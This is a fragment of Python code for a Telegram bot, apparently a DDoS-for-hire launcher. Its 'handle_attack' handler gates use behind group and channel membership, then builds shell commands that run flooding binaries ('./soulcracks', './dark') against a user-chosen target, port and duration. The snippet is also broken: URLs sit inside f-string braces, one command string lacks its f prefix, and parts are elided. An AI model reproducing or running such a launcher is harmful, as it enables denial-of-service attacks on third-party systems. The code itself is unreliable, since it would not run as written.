...
def handle_attack(message):
    ...
    if message.chat.id != int(GROUP_ID):
        bot.reply_to(message, f"🚫 𝐘𝐄 𝐁𝐎𝐓 𝐒𝐈𝐑𝐅 𝐆𝐑𝐎𝐔𝐏 𝐌𝐄 𝐂𝐇𝐀𝐋𝐄𝐆𝐀 ❌\n🔗 𝐉𝐨𝐢𝐧 𝐍𝐨𝐖: {https://t.me/+uEqrweX9rWE3YmQ9}")
        return

    if not is_user_in_channel(user_id):
        bot.reply_to(message, f"❗ **𝐏𝐀𝐇𝐋𝐄 𝐉𝐎𝐈𝐍 𝐊𝐑𝐎** {https://t.me/+uEqrweX9rWE3YmQ9} 🔥")
        return
    ...
    full_command = f"./soulcracks {target} {port} {time}", "./dark {target} {port} {time} 100",
